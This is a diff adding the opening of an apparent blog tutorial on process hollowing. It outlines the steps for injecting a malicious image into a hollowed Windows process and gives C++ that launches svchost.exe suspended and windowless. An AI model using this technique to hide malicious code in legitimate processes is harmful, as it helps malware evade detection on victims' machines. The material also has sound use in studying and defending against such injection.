@@ -59,3 +59,49 @@ Hey Internet, this is the first post of my upcoming one helluva great blog posts
 
 ## Process Hollowing
 
+### High level overview of the process hollowing
+
+1. Launch a Process in SUSPENDED state (victim process).
+2. Read a malicious image from disk, and write it into virtual address space.
+3. Carve out the victim process (Unmap/Hollow), in order to write our malicious code inside.
+4. Write malicious code's headers into the carved out address space.
+5. Write remaining sections of the malicious code into the carved out address space.
+6. Resume the Thread.
+
+### Hands on Process Hollowing
+
+I will use C++ for our example, also the technique I demonstrate in this example is very sensitive so it's possible that same code may not work when you build it and run.
+
+I'm running this code in Win11 22H4, with 64-bit executables and 64-bit intel CPU. 
+
+### Creating the Victim Process
+
+
+As we mentioned, we are creating a new process in a `SUSPENDED` state. This will prevent this process to run, until we finish our surgery on it.
+
+```cpp
+// 1) Prepare structures
+LPSTARTUPINFOA victim_si = new STARTUPINFOA();
+LPPROCESS_INFORMATION victim_pi = new PROCESS_INFORMATION();
+CONTEXT ctx = {};
+
+// 2) Launch 64‑bit svchost suspended
+if (!CreateProcessA(
+	(LPCSTR)"C:\\Windows\\System32\\svchost.exe",
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	FALSE,
+	CREATE_SUSPENDED | CREATE_NO_WINDOW,
+	NULL,
+	NULL,
+	victim_si,
+	victim_pi))
+{
+	printf("[-] CreateProcessA failed: %i\r\n",GetLastError());
+	return 1;
+}
+```
+
+
